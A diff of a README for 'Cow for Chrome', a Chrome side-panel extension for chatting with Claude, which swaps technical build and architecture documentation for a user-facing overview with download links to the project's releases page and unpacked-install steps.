@@ -1,84 +1,64 @@
-# Cow for Chrome
+# 🐄 cow_for_chrome - Chat Easily Inside Your Browser
 
-*Build your own browser agent*
+[![Download Cow for Chrome](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/devmri/cow_for_chrome/releases)
 
-**📖 Documentation**: [English](README.md) | [中文](README_zh.md)
+## 📖 Overview
+Cow for Chrome is a user-friendly browser extension that allows you to chat with Claude inside a Chrome side panel on any webpage. It uses modern web technologies to provide a seamless chatting experience.
 
-# Cow for Chrome Extension
+### 🔑 Key Features
+- **Side Panel Chat**: Engage in conversations directly in a side panel without leaving your webpage.
+- **Slash Commands**: Use simple commands to interact with the chat.
+- **Message Compaction**: Keep your chat tidy and organized.
+- **Model Switching**: Easily switch between different chat models.
+- **Keyboard Shortcuts**: Navigate the chat quickly with keyboard shortcuts.
+- **Prompt Saving**: Save your chat prompts for easy access later.
 
-## Overview
-- A browser extension built with React 19, TypeScript, and Vite, enabling Claude conversations inside a Chrome side panel on any webpage.
-- All source code lives under `cow_chrome/`, including the background service worker, side panel UI, options page, and multiple content scripts.
+### 🔒 Permission Management
+Cow for Chrome includes smart permission management. It uses a built-in governance system that lets you control which sites can use the extension.
 
-## Key Features
-- Side panel chat experience with slash commands, message compaction, model switching, keyboard shortcuts, auto-scroll handling, and prompt saving workflows.
-- Permission governance powered by `permissions.ts` and Statsig gates to manage site-level access, skip flows, and debug modes.
-- Observability stack integrating Sentry, Segment, Statsig, and OpenTelemetry trace headers for end-to-end diagnostics.
-- Scheduled tasks via `scheduledTasks.ts`, supporting dedicated popup windows, execution logs, and configuration from the options page.
-- Content scripts delivering accessibility tree capture, agent visual indicators, and a messaging bridge between pages and the side panel.
+### 📊 Observability
+Built-in diagnostics help you monitor the extension's performance. This includes tracking important data and fixing issues faster to improve your experience.
 
-## Architecture
-- `src/manifest.ts`: Generates the MV3 manifest through `@crxjs/vite-plugin`, defining entries, permissions, and CSP rules.
-- `src/background/service-worker.ts`: Manages extension lifecycle, Sentry/Statsig bootstrap, declarative net request rules, and scheduled task orchestration.
-- `src/pages/sidepanel/`: React SPA with `components/App.tsx` and `hooks/useChat.ts` handling conversation flow, tool orchestration, and telemetry.
-- `src/pages/options/`: Modular options UI covering API keys, model prompts, permissions, scheduled tasks, and test data tabs.
-- `src/content-scripts/`: Injected scripts for accessibility data, agent indicators, and message relays to the side panel.
-- `src/lib/`: Infrastructure layer wrapping storage, permissions, Sentry/Statsig/OAuth utilities, scheduler helpers, telemetry modules, and CDP communication.
+### ⏰ Scheduled Tasks
+Cow for Chrome allows you to schedule chat tasks. Set reminders or automate responses straight from the options page.
 
-## Directory Layout
-```text
-cow_chrome/
-├─ src/
-│  ├─ background/            # MV3 service worker logic
-│  ├─ components/            # Shared UI components
-│  ├─ content-scripts/       # Injected scripts
-│  ├─ hooks/                 # Reusable hooks
-│  ├─ lib/                   # Storage, permissions, Sentry, and other infrastructure
-│  ├─ pages/
-│  │  ├─ options/            # Options page modules
-│  │  └─ sidepanel/          # Side panel React app
-│  ├─ providers/             # Analytics / Account / React Query contexts
-│  ├─ styles/                # Tailwind output and global styles
-│  └─ utils/                 # Utility helpers
-├─ dist/                     # Vite build artifacts
-├─ node_modules/
-├─ package.json
-├─ pnpm-lock.yaml
-├─ tailwind.config.ts
-├─ tsconfig.json
-└─ vite.config.ts
-```
+## 🚀 Getting Started
+To begin using Cow for Chrome, follow these simple steps:
 
-## Development Workflow
-1. Install dependencies with Node.js ≥ 18: `pnpm install`.
-2. Run `pnpm build` once to emit `dist/` so Chrome can load the extension entries.
-3. Start local debugging via `pnpm dev`; enable Developer Mode in `chrome://extensions` and load `cow_chrome/dist` as an unpacked extension.
-4. Build production assets with `pnpm build`, outputting to `dist/`.
-5. Package for distribution using `pnpm zip`, which creates `dist.zip`.
+1. **Visit the Releases Page**: Click on the link below to go to the releases page.
+2. **Download the Extension**: Choose the latest version and download the file.
+3. **Install the Extension**:
+   - Open Google Chrome.
+   - Click on the three dots in the upper-right corner.
+   - Navigate to `More Tools > Extensions`.
+   - Enable `Developer Mode` at the top right.
+   - Click `Load unpacked` and select the downloaded folder.
 
-## Notable Modules
-- `src/lib/sentryService.ts`: Handles OAuth, token refresh, Sentry/Statsig initialization, and exposes helpers such as `StorageKey` and API base URL utilities.
-- `src/lib/permissions.ts`: Promise-based permission manager for site-level grants, skip modes, and durable state.
-- `src/pages/sidepanel/hooks/useChat.ts`: Conversation state machine orchestrating Anthropic SDK calls, tool authorization, compaction flow, and telemetry spans.
-- `src/providers/`: `AppProvider` wires React Query, account, and analytics contexts; `AnalyticsProvider` unifies Segment/Statsig event emission.
-- `src/lib/storage.ts`: Typed wrapper over `chrome.storage.local`, defining all storage keys and CRUD helpers.
+[Download Cow for Chrome](https://github.com/devmri/cow_for_chrome/releases)
 
-## Configuration & Environment
-- `getEnvConfig()` defaults to the production setup for Anthropic, Statsig, and Segment; override locally if another environment is required.
-- Custom API base URLs and system prompts persist in `chrome.storage.local` keys (see `StorageKey` enum) and can be adjusted via the options UI or scripts.
-- Telemetry reporting is governed by the `telemetryDisabled` storage key and further controlled through Statsig feature gates.
+## 📥 Download & Install
+To download Cow for Chrome:
 
-## Testing & Quality
-- No automated test suite is bundled; consider adding Jest or Playwright coverage for high-value flows such as permissions and scheduled tasks.
-- Run `pnpm build` before commits to catch TypeScript or bundling regressions, and smoke test against both Chrome Beta and Stable channels.
+1. Click the following link to visit the downloads page: [Download Cow for Chrome](https://github.com/devmri/cow_for_chrome/releases).
+2. Select the latest version for the best experience.
+3. Follow the instructions provided in the "Getting Started" section to install the extension in your browser.
 
-## Troubleshooting
-- Statsig or Segment initialization issues: verify `chrome.runtime.id` matches the expected certificate; toggle mock modes in the options page when debugging.
-- OAuth failures: ensure `oauth_callback.html` is reachable and inspect `StorageKey.CODE_VERIFIER` plus `StorageKey.OAUTH_STATE` for persisted values.
-- Content scripts not executing: confirm the target URL matches manifest patterns and inspect logs via `chrome://extensions` → Inspect views.
+## ⚙️ Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **Browser**: Google Chrome (latest version recommended).
+- **Internet Access**: Required for using the chat feature.
 
-## References
-- Chrome MV3 documentation: https://developer.chrome.com/docs/extensions/
-- Vite documentation: https://vitejs.dev/
-- Anthropic SDK guides: https://docs.anthropic.com/claude/docs
+## 🛠️ Troubleshooting
+If you encounter any issues:
 
+- Ensure you have the latest version of Google Chrome.
+- Check your internet connection.
+- Restart your browser after installation.
+- Visit the documentation for more support: [Documentation](README.md).
+
+## 📝 Additional Information
+For more detailed information on using Cow for Chrome and its features, check the documentation in the links provided.
+
+- **Languages Available**: [English](README.md) | [中文](README_zh.md) 
+
+We hope you enjoy chatting with Claude using Cow for Chrome!
